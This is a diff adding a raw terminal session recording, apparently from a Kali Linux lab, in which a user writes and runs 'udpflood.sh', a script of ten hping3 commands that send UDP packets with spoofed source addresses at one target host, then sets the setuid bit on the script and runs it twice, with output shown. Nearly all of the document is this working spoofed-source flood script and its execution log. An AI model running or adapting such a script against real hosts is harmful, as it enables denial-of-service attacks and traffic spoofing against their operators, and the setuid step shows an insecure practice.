@@ -1,0 +1,123 @@
+Script started on 2023-03-19 17:33:32-04:00 [TERM="xterm" TTY="/dev/pts/2" COLUMNS="71" LINES="24"]
+[?2004hkali-133.228.86.1> clear
+[?2004l[H[2J[3J
+[?2004hkali-133.228.86.1> clear[1Pexit./udpflood.sh [12@sudo chmod +s [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[6Pls -all[C[C[C[C[C[C[C[C[C[C[C[C[C[3Pnano[C[C[C[C[C[C[C[C[C[C[C[C[C
+[?2004l[?2004h[?1049h[22;0;0t[1;24r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[22;29H(B[0;7m[ Reading... ](B[m[22;28H(B[0;7m[ Read 12 lines ](B[m[H(B[0;7m  GNU nano 6.4                  udpflood.sh                            [1;70H(B[m[23d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[23;57H(B[0;7m^T(B[m Execute[24d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify[2d[36m#!/bin/bash[3d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.72.1(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[4d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.72.2(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[5d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.72.3(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[6d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.80.1(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[7d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.80.2(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[8d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.80.3(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[9d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.81.1(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[10d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.81.2(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[11d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.81.3(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[12d[39m(B[msudo hping3(B[0;1m[35m -a[39m(B[m 133.228.82.1(B[0;1m[35m -c[39m(B[m 10 -2(B[0;1m[35m -p[39m(B[m 1234(B[0;1m[35m -q[39m(B[m 133.228.86.3 [32m&[39m[42m [2d[49m(B[m[?12l[?25h[?25l[22d[J[24d[?12l[?25h[24;1H[?1049l[23;0;0t[?1l>[?2004l
+[?2004hkali-133.228.86.1> nano udpflood.sh clear[K[1Pexit./udpflood.sh [12@sudo chmod +s [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[6Pls -all[C[C[C[C[C[C[C[C[C[C[C[C[C
+[?2004l-rwsr-sr-x 1 crsuser crsuser 644 Mar 19 17:30 [0m[37;41mudpflood.sh[0m
+
+[?2004hkali-133.228.86.1> ls -all udpflood.sh [3Pnano[C[C[C[C[C[C[C[C[C[C[C[C[Cclear[Knano udpflood.sh [3@ls -all[C[C[C[C[C[C[C[C[C[C[C[C[C[Kls -all udpflood.sh [3Pnano[C[C[C[C[C[C[C[C[C[C[C[C[Cclear[K[1Pexit./udpflood.sh [12@sudo chmod +s [C[C[C[C[C[C[C[C[C[C[C[C
+[?2004l[sudo] password for crsuser: 
+
+[?2004hkali-133.228.86.1> sudo chmod +s udpflood.sh [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[6Pls -all[C[C[C[C[C[C[C[C[C[C[C[C[C[3Pnano[C[C[C[C[C[C[C[C[C[C[C[C[Cclear[K[1Pexitclearnano udpflood.sh [3@ls -all[C[C[C[C[C[C[C[C[C[C[C[C[C[6@sudo chmod +s[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo chmod +s udpflood.sh [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[6Pls -all[C[C[C[C[C[C[C[C[C[C[C[C[C[3Pnano[C[C[C[C[C[C[C[C[C[C[C[C[Cclear[K[1Pexit./udpflood.sh 
+[?2004l
+[?2004hkali-133.228.86.1> HPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytes
+
+
+HPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytes
+
+
+
+
+HPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytes
+
+
+
+
+
+
+--- 133.228.86.3 hping statistic ------ 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+10 packets transmitted, 0 packets received, 100% packet loss
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+^C[?2004l[?2004h[?2004l
+
+[?2004hkali-133.228.86.1> ./udpflood.sh 
+[?2004l
+[?2004hkali-133.228.86.1> HPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytesHPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytes
+
+HPING 133.228.86.3 (eth1 133.228.86.3): udp mode set, 28 headers + 0 data bytes
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--- 133.228.86.3 hping statistic ---
+--- 133.228.86.3 hping statistic ------ 133.228.86.3 hping statistic ---10 packets transmitted, 0 packets received, 100% packet loss
+
+10 packets transmitted, 0 packets received, 100% packet loss10 packets transmitted, 0 packets received, 100% packet loss--- 133.228.86.3 hping statistic ---
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms10 packets transmitted, 0 packets received, 100% packet loss
+
+round-trip min/avg/max = 0.0/0.0/0.0 msround-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+
+--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+--- 133.228.86.3 hping statistic ------ 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+10 packets transmitted, 0 packets received, 100% packet loss--- 133.228.86.3 hping statistic ---
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+round-trip min/avg/max = 0.0/0.0/0.0 ms10 packets transmitted, 0 packets received, 100% packet loss
+
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+--- 133.228.86.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+^C[?2004l[?2004h[?2004l
+
+[?2004hkali-133.228.86.1> exit
+[?2004lexit
+
+Script done on 2023-03-19 17:37:48-04:00 [COMMAND_EXIT_CODE="130"]
